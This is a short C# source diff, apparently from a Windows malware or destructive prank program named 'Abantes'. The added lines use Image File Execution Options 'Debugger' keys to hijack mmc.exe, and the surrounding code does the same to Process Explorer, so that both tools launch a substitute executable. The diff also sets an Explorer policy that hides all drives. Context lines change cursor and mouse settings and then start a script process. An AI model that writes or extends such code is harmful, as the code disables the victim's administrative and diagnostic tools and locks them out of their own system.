@@ -149,6 +149,9 @@ namespace Abantes
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                 editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
                 editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
@@ -191,6 +194,10 @@ namespace Abantes
                 editKey.Close();
                 editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Mouse");
                 editKey.SetValue("MouseTrails", "7");
+                editKey.Close();
+
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoViewOnDrive", "67108863", RegistryValueKind.DWord);
                 editKey.Close();
 
                 Process ScriptProcess = new Process();
